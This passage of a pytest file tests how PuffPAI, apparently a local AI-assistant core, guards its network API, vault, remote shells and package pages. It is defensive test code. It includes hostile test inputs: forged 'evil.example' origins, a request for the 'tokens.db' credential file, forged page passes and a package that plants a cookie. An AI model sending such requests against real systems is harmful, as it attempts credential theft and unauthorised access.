    ("GET", "/v1/recover", None), ("POST", "/v1/wizard/no-such-step", {}), ("POST", "/v1/checklist/x/run-admin", {}),
    ("POST", "/v1/vault/setup", {}), ("POST", "/v1/vault/unlock", {"method": "pin", "secret": ""}), ("POST", "/v1/vault/pin", {}), ("POST", "/v1/vault/recover", {}),
    ("POST", "/v1/vault/recovery-code/rotate", {}), ("POST", "/v1/vault/recovery-code/test", {}), ("POST", "/v1/vault/ways-in", {}),
    ("DELETE", "/v1/vault/ways-in/x", None), ("PUT", "/v1/vault/secrets/x", {}), ("DELETE", "/v1/vault/secrets/x", None),
    ("POST", "/v1/vault/inbox/file", {}), ("PUT", "/v1/toolsmith/keys/x", {}), ("DELETE", "/v1/toolsmith/keys/x", None),
    ("PUT", "/v1/github/key", {}), ("DELETE", "/v1/github/key", None), ("PUT", "/v1/toolsmith/search-key/x", {}),
    ("DELETE", "/v1/toolsmith/search-key/x", None), ("PUT", "/v1/toolsmith/apis/x/key", {}), ("DELETE", "/v1/toolsmith/apis/x/key", None),
    ("POST", "/v1/network/code", None), ("GET", "/v1/owner-files", None),
    ("GET", "/openai/v1/models", None), ("GET", "/ollama/api/tags", None),
    ("POST", "/openai/v1/chat/completions", {"messages": []}), ("POST", "/ollama/api/chat", {"messages": []}),
    ("POST", "/v1/tools/servers", {"name": "lamps", "address": "http://127.0.0.1:9/mcp"}),
    ("POST", "/v1/consent/any/answer", {"answer": "yes", "factor": "pin", "pin": "123456"}), ("POST", "/v1/bridge/open", {"pin": "123456"}),
])
def test_what_was_kept_on_this_computer_now_reaches_its_route(core, on, method, path, body, monkeypatch):
    """Past the gate: the route's own answer, whatever that is. With a half missing it is 401, on every one."""
    from puffpai_core import cli, window
    # Never a real window or console on her screen, even with the guard in the route broken.
    monkeypatch.setattr(cli, "open_terminal", lambda *a: pytest.fail("a console opened on the bot's computer"))
    monkeypatch.setattr(window, "open_window", lambda *a: pytest.fail("a window opened on the bot's computer"))
    d = _paired(core)
    r = d.open(method, path, body=body)
    assert r.status_code != 401 and (r.get_json(silent=True) or {}).get("code") != "this_computer", (path, r.status_code)
    assert d.open(method, path, body=body, second=False).status_code in (401, 200) if path == "/v1/recover" \
        else d.open(method, path, body=body, second=False).status_code == 401, path
    assert Device(core.app, peer="192.168.1.70").open(method, path, body=body).status_code == 401, path


def test_a_paired_device_stops_the_core_and_turns_the_setting_off(core, on):
    from puffpai_core.api.app import accept_shutdown
    stop = accept_shutdown(core.app)
    d = _paired(core)
    assert d.open("POST", "/v1/shutdown", second=False).status_code == 401 and not stop.is_set()
    assert d.open("POST", "/v1/shutdown").status_code == 202 and stop.is_set()
    r = d.open("PUT", "/v1/network", body={"on": False})
    assert r.status_code == 200 and r.json["on"] is False and network.saved_on(core.state) is False


def test_off_from_a_device_answers_it_then_closes_the_real_socket(core, on):
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses, on.names, on.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    assert on.open() is True
    origin = f"http://{STAND_IN}:{on.port}"
    try:
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=15)
        c.request("POST", "/v1/pair", body=json.dumps({"code": pairing.new_code(core.state)}),
                  headers={"Origin": origin, "X-PuffPAI": "1", "Content-Type": "application/json"})
        r = c.getresponse()
        data = json.loads(r.read())
        h = {"Cookie": r.getheader("Set-Cookie").split(";", 1)[0], auth.DEVICE_HEADER: data["device_key"], "Origin": origin,
             "X-PuffPAI": "1", "Content-Type": "application/json"}
        c.request("PUT", "/v1/network", body=json.dumps({"on": False}), headers=h)
        r = c.getresponse()
        assert r.status == 200 and json.loads(r.read())["on"] is False
        c.close()
        end = time.monotonic() + 15
        while not _refused(STAND_IN, on.port):
            assert time.monotonic() < end, "the socket stayed open"
            time.sleep(0.1)
    finally:
        on.close()


PIN = "correct horse battery 41"


def _vault(core, on):
    """A real test vault, set up over the network as a device would, and locked."""
    d = _paired(core)
    r = d.open("POST", "/v1/vault/setup", body={"pin": PIN})
    assert r.status_code == 201 and r.json["recovery_code"]
    assert d.open("POST", "/v1/vault/lock", body={}).status_code == 200
    assert d.get("/v1/vault/status").json["state"] == "locked"
    return d


def test_the_vault_opens_from_a_paired_device_and_a_wrong_pin_counts_as_ever(core, on):
    d = _vault(core, on)
    r = d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": "not the right one"})
    assert r.status_code == 401 and d.get("/v1/vault/status").json["state"] == "locked"
    r = d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN}, second=False)
    assert r.status_code == 401 and d.get("/v1/vault/status").json["state"] == "locked"
    r = d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN}, origin=False, headers={"Origin": "http://evil.example", "X-PuffPAI": "1"})
    assert r.status_code == 403 and d.get("/v1/vault/status").json["state"] == "locked"
    assert Device(core.app, peer="192.168.1.70").open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN}).status_code == 401
    r = d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN})
    assert r.status_code == 200 and r.json["state"] == "open"
    assert d.open("POST", "/v1/vault/pin", body={"pin": PIN, "new_pin": PIN + " and more"}).status_code == 200


def test_the_vaults_own_lockout_counts_a_device_the_same(core, on):
    from puffpai_core.zone1 import vault as vault_mod
    d = _vault(core, on)
    for _ in range(vault_mod.FREE_ATTEMPTS + 1):
        assert d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": "not the right one"}).status_code == 401
    r = d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN})   # even the right PIN waits now
    assert r.status_code == 429 and d.get("/v1/vault/status").json["state"] != "open"


def test_a_pin_is_in_no_log_or_audit_line(core, on, caplog):
    d = _vault(core, on)
    d.open("POST", "/v1/vault/unlock", body={"method": "pin", "secret": PIN})
    assert PIN not in caplog.text
    for p in Path(core.state).rglob("*"):
        if p.is_file() and p.suffix in (".log", ".jsonl", ".json"):
            assert PIN not in p.read_text(encoding="utf-8", errors="replace"), p.name


# -- the shell, through the Desktop's own view (window lane, D139) -------------------------------------------------------
@pytest.fixture
def shells(core, tmp_path):
    from puffpai_core.api.groups import dev
    mgr = dev.shells(core.app)
    mgr.home, mgr._reaper_on = tmp_path, False
    yield mgr
    dev.close_all(core.app, "test_end")


def test_every_shell_route_needs_both_halves_and_the_origin(core, on, shells):
    d = _paired(core)
    for method, path, body in (("POST", "/v1/dev/shell", {"shell": "cmd"}), ("GET", "/v1/dev/shell", None), ("POST", "/v1/dev/shell/x/input", {"text": "dir"}),
                               ("GET", "/v1/dev/shell/x/events", None), ("DELETE", "/v1/dev/shell/x", None)):
        assert d.open(method, path, body=body, second=False).status_code == 401, path
        assert d.open(method, path, body=body, cookie=False).status_code == 401, path
        assert Device(core.app, peer="192.168.1.70").open(method, path, body=body).status_code == 401, path
        if method != "GET":
            r = d.open(method, path, body=body, origin=False, headers={"Origin": "http://evil.example", "X-PuffPAI": "1"})
            assert r.status_code == 403, path
    assert shells.list() == []


@pytest.mark.skipif(os.name != "nt", reason="the shells these open are PowerShell and cmd; the owner's Linux try covers the rest")
def test_a_real_shell_and_its_stream_over_a_real_socket_tied_to_its_device(core, on, shells):
    """Open, type, read the event stream as it comes, as ``P.stream`` does: real sockets, the login's own headers."""
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses, on.names, on.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    assert on.open() is True
    origin = f"http://{STAND_IN}:{on.port}"

    def login():
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=30)
        c.request("POST", "/v1/pair", body=json.dumps({"code": pairing.new_code(core.state)}),
                  headers={"Origin": origin, "X-PuffPAI": "1", "Content-Type": "application/json"})
        r = c.getresponse()
        data = json.loads(r.read())
        c.close()
        return {"Cookie": r.getheader("Set-Cookie").split(";", 1)[0], auth.DEVICE_HEADER: data["device_key"], "Origin": origin,
                "X-PuffPAI": "1", "Content-Type": "application/json"}

    def call(method, path, headers, body=None):
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=30)
        c.request(method, path, body=None if body is None else json.dumps(body), headers=headers)
        r = c.getresponse()
        data = r.read()
        c.close()
        return r.status, data

    try:
        mine, other = login(), login()
        status, data = call("POST", "/v1/dev/shell", mine, {"shell": "cmd"})
        assert status == 201
        sid = json.loads(data)["id"]
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=30)
        c.request("GET", f"/v1/dev/shell/{sid}/events?timeout=20", headers=mine)
        stream = c.getresponse()
        assert stream.status == 200 and stream.getheader("Content-Type").startswith("text/event-stream")
        assert stream.readline().startswith(b"retry:")     # the stream is open before the shell has said anything
        assert call("POST", f"/v1/dev/shell/{sid}/input", mine, {"text": "echo over-the-network"})[0] == 200
        seen = b""
        end = time.monotonic() + 20
        while b"over-the-network" not in seen.replace(b"echo over-the-network", b"") and time.monotonic() < end:
            seen += stream.readline()
        assert b"over-the-network" in seen
        c.close()
        # Tied to the device that opened it, here as on this computer. Any device may close one: closing only narrows.
        assert call("POST", f"/v1/dev/shell/{sid}/input", other, {"text": "echo nope"})[0] == 404
        assert call("GET", f"/v1/dev/shell/{sid}/events?timeout=0", other)[0] == 404
        rows = {r["id"]: r["mine"] for r in json.loads(call("GET", "/v1/dev/shell", other)[1])}
        assert rows == {sid: False}
        assert json.loads(call("GET", "/v1/dev/shell", mine)[1])[0]["mine"] is True
        assert call("DELETE", f"/v1/dev/shell/{sid}", other)[0] == 200
    finally:
        on.close()


def test_being_local_is_no_proof_on_the_network(core, on, monkeypatch):
    """``knowledge.py``'s picker read ``remote_addr``. With a peer that says 127.0.0.1 on the network listener, the listener decides."""
    from puffpai_core import send_file
    monkeypatch.setattr(send_file, "can_pick", lambda: True)
    monkeypatch.setattr(send_file, "pick", lambda kind: pytest.fail("a dialog opened on the bot's computer"))
    d = _paired(core)
    r = d.open("POST", "/v1/knowledge/pick", body={"kind": "file"})
    assert r.status_code == 200 and r.json["typed"] is True and r.json["path"] == ""
    on.peer_ok = lambda a: True                     # the worst case: the peer check let a local address through
    r = Device(core.app, peer="127.0.0.1")
    r.cookies, r.second = d.cookies, d.second
    got = r.open("POST", "/v1/knowledge/pick", body={"kind": "file"})
    assert got.status_code == 200 and got.json["typed"] is True
    # on this computer it still opens
    monkeypatch.setattr(send_file, "pick", lambda kind: "C:/picked.txt")
    key = core.tokens.issue_device("a device")
    got = core.app.test_client().post("/v1/knowledge/pick", json={"kind": "file"}, headers=local(key),
                                      environ_base={"REMOTE_ADDR": "127.0.0.1"})
    assert got.status_code == 200 and got.json["path"] == "C:/picked.txt"


# -- what would happen on a screen she can't see -------------------------------------------------------------------------
def test_a_browser_with_nothing_else_uses_the_window_page(core, on, monkeypatch):
    """No launcher and no window program on the other device: a plain browser gets the window's own page."""
    from puffpai_core import cli, window
    monkeypatch.setattr(window, "open_window", lambda *a: pytest.fail("a window opened on the bot's computer"))
    monkeypatch.setattr(cli, "open_terminal", lambda *a: pytest.fail("a console opened on the bot's computer"))
    d = _paired(core)
    r = d.get("/window/", second=False)                  # a page load: the cookie alone, as for the Desktop's files
    assert r.status_code == 200 and "window.js" in r.get_data(as_text=True)
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert d.get("/window/window.js", second=False).status_code == 200
    r = d.open("POST", "/v1/window/open")
    assert r.status_code == 200 and r.json["url"] == "/window/"
    r = d.open("POST", "/v1/terminal/open", body={})
    assert r.status_code == 200 and r.json["ok"] is False and r.json["url"] == "/#developer/terminal"
    assert d.get("/v1/recover", second=False).status_code == 200
    assert Device(core.app, peer="192.168.1.70").get("/v1/recover").status_code == 401


def test_a_program_opens_on_the_computer_never_from_the_network(core, on, tmp_path, monkeypatch):
    monkeypatch.setattr(subprocess, "Popen", lambda *a, **k: pytest.fail("a program started on the bot's computer"))
    _add(core, tmp_path, "gui-app", "made", ui={"open": {"program": "notepad.exe"}})
    r = _paired(core).open("POST", "/v1/packages/gui-app/open/program")
    assert r.status_code == 409 and r.json["code"] == "this_computer"


def test_a_file_comes_to_the_device_that_asked(core, on, monkeypatch):
    from puffpai_core import owner_files
    monkeypatch.setattr(owner_files, "_start", lambda *a: pytest.fail("a file opened on the bot's computer"))
    data = Path(core.state) / "data"
    data.mkdir(parents=True, exist_ok=True)
    (data / "my.docx").write_bytes(b"the file's own bytes")
    (data / "run.exe").write_bytes(b"MZ")
    d = _paired(core)
    r = d.open("POST", "/v1/knowledge/files/open", body={"path": str(data / "my.docx")})
    assert r.status_code == 200 and r.data == b"the file's own bytes"
    assert "attachment" in r.headers["Content-Disposition"] and "my.docx" in r.headers["Content-Disposition"]
    assert r.headers["Cache-Control"] == "no-store" and r.headers["X-Content-Type-Options"] == "nosniff"
    assert d.open("POST", "/v1/knowledge/files/open", body={"path": str(data / "my.docx")}, second=False).status_code == 401
    assert d.open("POST", "/v1/knowledge/files/open", body={"path": str(data / "run.exe")}).status_code == 400
    assert d.open("POST", "/v1/knowledge/files/open", body={"path": str(core.state / "tokens.db")}).status_code == 400
    # On this computer it still opens there.
    started = []
    monkeypatch.setattr(owner_files, "_start", lambda p: started.append(p))
    key = core.tokens.issue_device("a device")
    r = core.app.test_client().post("/v1/knowledge/files/open", json={"path": str(data / "my.docx")}, headers=local(key))
    assert r.status_code == 200 and r.json == {"opened": True} and len(started) == 1


# -- what D136, D137 and D138 added ------------------------------------------------------------------------------------
def test_the_model_routes_work_for_a_paired_device_and_no_key_gets_in(core, on):
    """The same two halves as everything else. An owner key or a package token is no way in here, paired or not."""
    owner, package = core.tokens.issue_owner_key(), core.tokens.issue_package_token("some-app")
    d, c = _paired(core), core.app.test_client()
    for path in ("/openai/v1/models", "/ollama/api/tags"):
        assert d.get(path).status_code == 200, path
        assert d.get(path, second=False).status_code == 401, path
        assert Device(core.app, peer="192.168.1.70").get(path).status_code == 401, path
        for token in (owner, package):
            r = Device(core.app, peer="192.168.1.70").get(path, headers=local(token))
            assert r.status_code == 403 and r.json["error"] == network.KEYS_REFUSED, path
            assert d.get(path, headers=local(token)).status_code == 403, path         # with both halves too
        assert c.get(path, headers=local(owner)).status_code == 200, path            # the owner key, on this computer
    for path in ("/openai/v1/chat/completions", "/ollama/api/chat"):
        assert d.open("POST", path, body={"messages": []}).status_code == 400, path   # reached the route: its own answer
        r = d.open("POST", path, body={"messages": []}, origin=False, headers={"Origin": "http://evil.example", "X-PuffPAI": "1"})
        assert r.status_code == 403, path
        r = Device(core.app, peer="192.168.1.70").open("POST", path, headers=local(owner), body={"messages": []})
        assert r.status_code == 403 and r.json["error"] == network.KEYS_REFUSED, path
        assert c.post(path, json={"messages": []}, headers=local(owner)).status_code == 400, path


def test_a_device_adds_a_tool_server(core, on, monkeypatch):
    from puffpai_core import tool_servers as ts
    from puffpai_core.zone2 import mcp
    monkeypatch.setattr(mcp, "list_tools", lambda _t: [{"name": "lamp", "description": "A lamp."}])
    body = {"name": "lamps", "address": "http://127.0.0.1:9/mcp"}
    d = _paired(core)
    assert d.open("POST", "/v1/tools/servers", body=body, second=False).status_code == 401 and ts.rows(core.state) == {}
    r = d.open("POST", "/v1/tools/servers", body=body)
    assert r.status_code == 200 and list(ts.rows(core.state)) == ["lamps"]


def test_where_a_package_files_go_answers_a_device(core, on):
    assert "made" in _paired(core).get("/v1/owner-files").json


def test_a_tool_server_she_added_can_be_read_refreshed_and_removed(core, on, monkeypatch):
    from puffpai_core import tool_servers as ts
    from puffpai_core.zone2 import mcp
    monkeypatch.setattr(mcp, "list_tools", lambda _t: [{"name": "lamp", "description": "A lamp."}])
    ts._save(core.state, {"id": "lamps", "name": "Lamps", "url": "http://127.0.0.1:9/mcp", "kind": "http", "has_password": False,
                          "added_at": "", "added_by": "owner", "tools": [], "state": "ready"})
    d = _paired(core)
    for method, path in (("GET", "/v1/tools/servers"), ("POST", "/v1/tools/servers/lamps/refresh"), ("DELETE", "/v1/tools/servers/lamps")):
        assert d.open(method, path, second=False).status_code == 401, path
    assert d.get("/v1/tools/servers").json["servers"][0]["id"] == "lamps"
    assert d.open("POST", "/v1/tools/servers/lamps/refresh").json["server"]["tool_count"] == 1
    assert d.open("DELETE", "/v1/tools/servers/lamps").json["deleted"] is True and ts.rows(core.state) == {}


def test_her_books_are_open_to_a_paired_device_and_a_cookie_alone_gets_nothing(core, on):
    """Reading, looking and removing: a device can already remove an app, a folder link or another device. Removing a book
    runs nothing and carries no secret."""
    from test_books import _saved, tiny_zim, TURNIPS
    from puffpai_core.zone1 import fetched
    path = _saved(core.state)
    tiny_zim(fetched.folder_for(core.state, "kn-kiwix-one") / "g.zim", [("t", "Turnips", TURNIPS)])
    d = _paired(core)
    for url, said in (("/v1/knowledge/books/read?source=wikipedia&file=turnips.txt", "parts"),
                      ("/v1/knowledge/books/articles?source=kn-kiwix-one", "articles"),
                      ("/v1/knowledge/books/article?source=kn-kiwix-one&url=A/t", "text"), ("/v1/knowledge/files", "files")):
        r = d.get(url)
        assert r.status_code == 200 and said in r.json, url
        assert d.get(url, second=False).status_code == 401, url
    remove = {"source": "wikipedia", "file": "turnips.txt"}
    for post, body in (("/v1/knowledge/books/look", {}), ("/v1/knowledge/find", {"words": "  "}), ("/v1/knowledge/books/remove", remove)):
        assert d.open("POST", post, body=body, second=False).status_code == 401, post
    assert path.exists()
    assert d.open("POST", "/v1/knowledge/books/look", body={}).json["looking"] is False
    assert d.open("POST", "/v1/knowledge/find", body={"words": "  "}).status_code == 400     # the route's own answer
    assert d.open("POST", "/v1/knowledge/books/remove", body=remove).json == {"removed": "turnips.txt"}
    assert not path.exists()


def _waiting_card(core, question):
    """A real card, raised as the Brain raises it: ``wiring.core_question``, the turn waiting on another thread."""
    from puffpai_core import wiring
    got: dict = {}
    t = threading.Thread(target=lambda: got.update(v=wiring.core_question(core, wait_s=30)(question)), daemon=True)
    t.start()
    end = time.monotonic() + 20
    while not core.consent.list(status="pending"):
        assert time.monotonic() < end, "no card was raised"
        time.sleep(0.02)
    return core.consent.list(status="pending")[0], t, got


def _run_command_card(core):
    from puffpai_core.zone2 import commands
    return commands.question(core.state, {"command": "echo soup"}, {"keep": str})


def _add_server_card(_core):
    return {"kind": "core_change", "tool": "add_tool_server", "title": "May I add the tool server Lamps?", "arguments": ["name: Lamps"]}


@pytest.mark.parametrize("question", [_run_command_card, _add_server_card])
def test_a_device_says_yes_to_a_card_that_runs_a_command_or_adds_a_server(core, on, question):
    rec, t, got = _waiting_card(core, question(core))
    cid, yes = rec["consent_id"], {"answer": "yes", "factor": "tap", "card_sha": rec["card_sha"]}
    d = _paired(core)
    assert [c["consent_id"] for c in d.get("/v1/consent?status=pending").json] == [cid]
    assert d.open("POST", f"/v1/consent/{cid}/answer", body=yes, second=False).status_code == 401
    assert core.consent.get(cid)["status"] == "pending"
    r = d.open("POST", f"/v1/consent/{cid}/answer", body=yes)
    assert r.status_code == 200 and r.json["status"] == "granted"
    t.join(20)
    assert got["v"] is True


@pytest.mark.parametrize("question", [_run_command_card, _add_server_card])
def test_a_device_can_say_no_to_those_cards(core, on, question):
    rec, t, got = _waiting_card(core, question(core))
    r = _paired(core).open("POST", f"/v1/consent/{rec['consent_id']}/answer", body={"answer": "no", "factor": "tap"})
    assert r.status_code == 200 and r.json["status"] == "declined"
    t.join(20)
    assert got["v"] is False


def test_any_other_one_tap_yes_still_works_from_a_device(core, on):
    rec, t, got = _waiting_card(core, {"kind": "core_change", "tool": "remove_tool_server", "title": "May I remove Lamps?",
                                       "arguments": ["name: Lamps"]})
    r = _paired(core).open("POST", f"/v1/consent/{rec['consent_id']}/answer",
                           body={"answer": "yes", "factor": "tap", "card_sha": rec["card_sha"]})
    assert r.status_code == 200 and r.json["status"] == "granted"
    t.join(20)
    assert got["v"] is True


def test_a_cookie_alone_answers_no_card(core, on):
    rec, t, got = _waiting_card(core, _run_command_card(core))
    d = _paired(core)
    assert d.open("POST", f"/v1/consent/{rec['consent_id']}/answer", body={"answer": "no"}, second=False).status_code == 401
    assert core.consent.get(rec["consent_id"])["status"] == "pending"
    assert d.open("POST", f"/v1/consent/{rec['consent_id']}/answer", body={"answer": "no"}).status_code == 200
    t.join(20)
    assert got["v"] is False


# -- package pages -----------------------------------------------------------------------------------------------------
class _FakePackage(http.server.BaseHTTPRequestHandler):
    seen: list = []

    def _answer(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n:
            self.rfile.read(n)
        _FakePackage.seen.append({"path": self.path, "headers": {k.lower(): v for k, v in self.headers.items()}})
        self.send_response(200)
        for k, v in (("Set-Cookie", "puffpai_device=planted; Path=/"), ("Content-Type", "text/plain")):
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(b"page")

    do_GET = do_POST = _answer

    def log_message(self, *a):
        pass


def _add(core, tmp_path, id, origin, ui=None, running_on=None):
    folder = tmp_path / id
    shutil.copytree(HELLO, folder)
    manifest = json.loads((folder / "puffpai.json").read_text(encoding="utf-8"))
    manifest["id"] = id
    manifest["ui"] = {"pages": [{"id": "home", "path": "/", "title": id}]} if ui is None else ui
    (folder / "puffpai.json").write_text(json.dumps(manifest), encoding="utf-8")
    core.installs.set(id, folder, link=True, source=str(folder))
    core.registry.add(row_from_manifest(manifest, origin, manifest_sha=manifest_sha(folder)))
    if running_on:
        core.steward._running[id] = Running(id, "command", running_on, f"ppt_{id}", time.time())
    return manifest


@pytest.fixture
def fake_server():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _FakePackage)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    _FakePackage.seen = []
    yield srv.server_address[1]
    srv.shutdown()
    srv.server_close()


@pytest.fixture
def apps(core, on, tmp_path, fake_server):
    """A package of PuffPAI's own origin, one made by Toolsmith, and one adopted, all 'running' on a fake server."""
    _add(core, tmp_path, "made-app", "made", running_on=fake_server)
    _add(core, tmp_path, "other-app", "made", running_on=fake_server)
    _add(core, tmp_path, "outside-app", "adopted:https://example.test/x", running_on=fake_server,
         ui={"pages": [{"id": "home", "url": "http://127.0.0.1:{port}/", "title": "x"}]})
    yield core
    for id in ("made-app", "other-app", "outside-app"):
        core.steward._running.pop(id, None)


def page(core, package, device=None, port=None, peer=PEER, method="GET", headers=None, host=ADDRESS, path="/", body=None):
    net = core.app.extensions[network.EXTENSION]
    port = port or net.page_port(package) or 19999
    h = dict(headers or {})
    if device is not None:
        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in device.cookies.items())
    return core.app.test_client(use_cookies=False).open(
        path, method=method, base_url=f"http://{host}:{port}", headers=h, data=body,
        environ_base={"puffpai.listener": NETWORK_PAGE_LISTENER, NETWORK_PACKAGE: package, "REMOTE_ADDR": peer})


def _get_passes(device, core):
    """``GET /v1/network/pages``, as the Desktop asks with both halves. The test keeps its Set-Cookie lines, as a browser would."""
    net = core.app.extensions[network.EXTENSION]
    net.page_ports()
    r = device.get("/v1/network/pages")
    assert r.status_code == 200
    for line in r.headers.getlist("Set-Cookie"):
        name, _, rest = line.partition("=")
        device.cookies[name] = rest.split(";", 1)[0]
        assert "HttpOnly" in line and "SameSite=Strict" in line and "Domain" not in line
    return r.json["ports"]


@pytest.fixture
def page_ports_bound(on):
    """No real page socket for a test-client case: the ports are only saved."""
    def no_socket(sock, *a):
        sock.close()
        return object()
    on.accepting, on._server = True, object()
    on._close, on._serve = (lambda servers: None), no_socket
    import puffpai_core.corelock as corelock
    real = corelock.exclusive_socket
    corelock.exclusive_socket = lambda host, port: socket.socket()
    yield on
    corelock.exclusive_socket = real
    on._server, on._pages, on.accepting = None, {}, False


def test_a_program_holding_a_page_port_moves_the_package(core, on, tmp_path):
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses, on.peer_ok = (lambda: {STAND_IN}), (lambda a: True)
    base = _free_port(STAND_IN)
    on.page_range = range(base, base + 5)
    _add(core, tmp_path, "made-app", "made")
    on.open()
    held = on.page_ports()["made-app"]
    try:
        with socket.socket() as other:
            other.bind((STAND_IN, held))
            other.listen(1)
            moved = on.open_pages()["made-app"]
        assert moved != held and on.page_port("made-app") == moved and not _refused(STAND_IN, moved)
    finally:
        on.close()


def test_a_page_needs_its_own_pass_and_nothing_secret_reaches_it(apps, page_ports_bound, fake_server):
    core, d = apps, _paired(apps)
    ports = _get_passes(d, core)
    assert set(ports) == {"made-app", "other-app"} and len(set(ports.values())) == 2     # no port for an adopted app
    assert all(p >= 19100 for p in ports.values())
    assert page(core, "made-app").status_code == 401               # no pass: nothing reached the package
    assert _FakePackage.seen == []
    r = page(core, "made-app", d, headers={auth.DEVICE_HEADER: d.second, "Authorization": ""})
    assert r.status_code == 200 and r.get_data() == b"page"
    seen = _FakePackage.seen[-1]["headers"]
    assert "cookie" not in seen and auth.DEVICE_HEADER.lower() not in seen and "x-puffpai" not in seen
    assert seen["authorization"] == "Bearer ppt_made-app"         # today's rule: the Core adds the package's own token
    assert seen["host"] == f"{ADDRESS}:{ports['made-app']}"
    text = json.dumps(seen)
    for name, value in d.cookies.items():
        assert value not in text and name not in text
    assert d.second not in text
    assert "Set-Cookie" not in r.headers                           # a package can't plant a cookie through the Core


def test_one_package_pass_does_not_open_another(apps, page_ports_bound):
    core, d = apps, _paired(apps)
    ports = _get_passes(d, core)
    mine, other = ports["made-app"], ports["other-app"]
    only = {network.page_cookie_name(mine): d.cookies[network.page_cookie_name(mine)]}
    a = Device(core.app)
    a.cookies = dict(only)
    assert page(core, "made-app", a).status_code == 200
    assert page(core, "other-app", a).status_code == 401
    a.cookies = {network.page_cookie_name(other): only[network.page_cookie_name(mine)]}     # its value under the other's name
    assert page(core, "other-app", a).status_code == 401
    assert page(core, "made-app", a, port=other).status_code == 404    # another package's port: refused
    for bad in ("", "x", "9999999999.nope", "1.2", d.cookies[network.cookie_name(core.app.extensions[network.EXTENSION].port)]):
        a.cookies = {network.page_cookie_name(mine): bad}
        assert page(core, "made-app", a).status_code == 401, bad


def test_a_device_cookie_or_second_half_is_no_pass(apps, page_ports_bound):
    core, d = apps, _paired(apps)
    _get_passes(d, core)
    bare = Device(core.app)
    bare.cookies = {network.cookie_name(core.app.extensions[network.EXTENSION].port): d.cookies[network.cookie_name(core.app.extensions[network.EXTENSION].port)]}
    assert page(core, "made-app", bare, headers={auth.DEVICE_HEADER: d.second}).status_code == 401


def test_a_page_pass_ends_with_its_time_and_with_its_device(apps, page_ports_bound):
    core = apps
    keep, gone = _paired(core), _paired(core, peer="192.168.1.51")
    _get_passes(keep, core)
    _get_passes(gone, core)
    assert page(core, "made-app", gone).status_code == 200
    mine = next(x["id"] for x in gone.get("/v1/devices").json["devices"] if x["this"])
    assert keep.open("DELETE", f"/v1/devices/{mine}").status_code == 200
    assert page(core, "made-app", gone).status_code == 401         # on its very next request
    assert page(core, "made-app", keep).status_code == 200
    token = keep.cookies[network.cookie_name(core.app.extensions[network.EXTENSION].port)]
    old = core.tokens.page_pass(token, "made-app", now=time.time() - auth.PAGE_PASS_S - 5)
    assert core.tokens.page_pass_ok(old, "made-app") is False
    assert core.tokens.page_pass_ok(core.tokens.page_pass(token, "made-app"), "made-app") is True
    assert core.tokens.page_pass("ppd_not_a_token", "made-app") is None


def test_a_page_port_refuses_keys_and_keeps_its_own_origin_rules(apps, page_ports_bound):
    core, d = apps, _paired(apps)
    ports = _get_passes(d, core)
    own = f"http://{ADDRESS}:{ports['made-app']}"
    for token in (core.tokens.issue_owner_key(), core.tokens.issue_package_token("made-app"), core.tokens.issue_toolsmith("b1")):
        assert page(core, "made-app", d, headers=local(token)).status_code == 403
    assert page(core, "made-app", d, peer="8.8.8.8").status_code == 403
    assert page(core, "made-app", d, peer="100.100.2.2").status_code == 403      # a VPN address
    assert page(core, "made-app", d, host="evil.example").status_code == 421
    for origin in ("http://evil.example", f"http://{ADDRESS}:{ports['other-app']}", f"http://{ADDRESS}:{core.app.extensions[network.EXTENSION].port}", "null"):
        assert page(core, "made-app", d, method="POST", headers={"Origin": origin}).status_code == 403, origin
    assert page(core, "made-app", d, method="POST", headers={"Origin": own}).status_code == 200
    r = page(core, "made-app", d)
    csp = " ".join(r.headers.getlist("Content-Security-Policy"))
    assert f"default-src 'self' {own}" in csp and "localhost" not in csp and "*" not in csp
    assert f"frame-ancestors http://{ADDRESS}:{core.app.extensions[network.EXTENSION].port}" in csp
    # Only the Desktop's own origin reads an answer, with its pass; any other origin gets no cross-origin answer.
    desktop = f"http://{ADDRESS}:{core.app.extensions[network.EXTENSION].port}"
    r = page(core, "made-app", d, headers={"Origin": desktop})
    assert r.headers["Access-Control-Allow-Origin"] == desktop and r.headers["Access-Control-Allow-Credentials"] == "true"
    r = page(core, "made-app", d, headers={"Origin": f"http://{ADDRESS}:{ports['other-app']}"})
    assert "Access-Control-Allow-Origin" not in r.headers
    # A page path never reaches the Core's API: it goes to the package.
    r = page(core, "made-app", d, path="/v1/settings")
    assert r.get_data() == b"page" and _FakePackage.seen[-1]["path"] == "/v1/settings"


def test_adopted_apps_and_tries_never_get_a_port_or_a_token(apps, page_ports_bound, fake_server):
    core, d = apps, _paired(apps)
    assert "outside-app" not in _get_passes(d, core)
    _FakePackage.seen = []
    # Even if something opened a port for one and a pass were forged from a real device's binding: refused before it.
    token = d.cookies[network.cookie_name(core.app.extensions[network.EXTENSION].port)]
    d.cookies[network.page_cookie_name(19999)] = core.tokens.page_pass(token, "outside-app")
    assert page(core, "outside-app", d).status_code == 404
    assert page(core, "a-try-123", d).status_code == 404           # a try is no Registry row
    assert _FakePackage.seen == []
    r = d.get("/v1/packages/outside-app/frame")
    assert r.status_code == 200
    assert r.json["ok"] is False and r.json["url"] == "" and r.json["kind"] == "computer"
